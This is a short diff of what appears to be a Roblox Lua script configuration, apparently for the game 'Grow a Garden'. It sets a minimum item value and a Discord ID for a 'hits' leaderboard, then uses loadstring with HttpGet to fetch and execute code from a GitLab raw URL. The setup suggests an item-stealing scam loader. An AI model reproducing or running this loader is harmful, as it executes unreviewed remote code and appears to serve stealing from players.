@@ -4,3 +4,4 @@ MinimumValue = 1000000
 DiscordID = "bombclatiii" -- optional if you wanna be in hits lb
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))() 
+
